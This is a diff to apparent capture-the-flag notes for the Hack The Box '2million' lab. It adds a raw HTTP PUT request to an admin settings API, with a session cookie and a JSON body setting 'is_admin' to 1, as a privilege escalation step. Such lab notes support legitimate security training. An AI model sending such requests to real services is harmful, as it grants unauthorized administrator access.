@@ -21,3 +21,26 @@ Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/w
 Accept-Encoding: gzip, deflate, br
 Cookie: PHPSESSID=uunul7pqq66sstr9cvdjn3jiad
 Connection: keep-alive
+
+
+admin priv esc (website)
+
+```
+PUT /api/v1/admin/settings/update HTTP/1.1
+Host: 2million.htb
+Accept-Language: en-US,en;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate, br
+Cookie: PHPSESSID=uunul7pqq66sstr9cvdjn3jiad
+Connection: keep-alive
+Content-Length: 74
+Content-Type: application/json
+
+{
+	"email":         "test@test.com",
+"is_admin":1,
+"username":"test"
+}
+```
